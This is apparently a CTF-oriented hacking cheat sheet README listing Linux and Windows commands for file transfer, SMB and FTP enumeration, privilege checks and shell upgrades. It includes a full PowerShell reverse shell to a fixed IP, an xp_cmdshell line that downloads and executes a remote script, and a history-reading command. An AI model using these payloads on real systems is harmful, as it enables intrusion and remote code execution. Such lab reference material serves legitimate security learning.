# hacking-cheatsheet
📑 _A hacking cheat sheet to help you cover all the basic needs_

_ps: i'll be updating this cheat sheet every week_


## Simple file transfering using SFTP
```bash 
sftp user@remoteip
sftp > put file
```

that's all we need to transfer files from local machine to remote servers as easy as possible

## Extracting tar files
```bash
tar -xvf archive.tar
```
used to exctrat files commonly present in CTFs programs

## Verifying SHA256 checksum in linux
```bash
sha256sum <filename>
```
`ps: we can compare the checksum with the sums file (in case you download it) using -c flag`

### Explaining /dev/null command in CTFs and privilege escalation techniques
```bash
<code here> 2>/dev/null
# /dev/null stands for null device on linux system, it operates just like a black hole, 
# throwing all outputs over there
```
`>` operator stands for redirection
`2` stands for error files

that's because all linux commands generates three main files associated with it

0 = standard input

1 = standard output

2 = standard error

So that's why 2>/dev/null is used to drop errors inside the Linux system's black hole.

## Simple kill process 
```bash
sudo kill <pid> 
```

## Using a simple SOCKS Proxy
```bash
ssh <remoteip> -l <username> -D 127.0.0.1:1080
# -D enables socks proxy binding our machine's traffic with the remote one
```
We can use it along Burp Suite to forward all the VPS's traffic through our local machine
using the burp's proxy on the local browser at the same time

`ps: here you will need to configure burp as well`

## Anonymous login
```bash
ftp <target ip address>
username: anonymous
password: [enter key]
```

## smbclient
```bash
# connects to the target listing all the shared documents
smbclient -N -L \\\\target ip\\ # -N supress the password prompt
smbclient -N \\\\target ip\\openshares

get <file> # downloads the file
more <file> # outputs the content file without the needing to download 
# in our local machine
```

## User enum and permissions
```bash
sudo -l # checks which commands we can execute on the system
id # checks users permissions

find / -group <groupname> 2>/dev//null # to find a specific group name
```

## Upgrading our shell
```bash 
python -c 'import pty; pty.spawn("/bin/bash")'
# here pty module let's us spawn a pseudo terminal
```

## Reverse shell ps1
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

// execute the xp_cmd command bellow on the compromised target system 
// on a xp_cmdshell environment 

xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.139/powershell_reverse_shell.ps1\");"
```

## Discovering Powershell history
```bash
type C:\Users\<groupname>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
## Restrict user bash 
useful when practicing KOTH / Battlegrounds
```bash
chsh -s /bin/rbash <username>
```
## remove users .bashrc file
```bash
rm /home/username/.bashrc
```
## fetches all users in /etc/passwd file
```bash
cut -f1 -d: /etc/passwd
```

## check all services running (forest format)
Useful for identifying attackers on the same machine
| we can track all ssh sessions including meterpreter access
```bash
ps -aef --forest 
``` 

## user login/logout connection info
```bash 
last -aiF
```
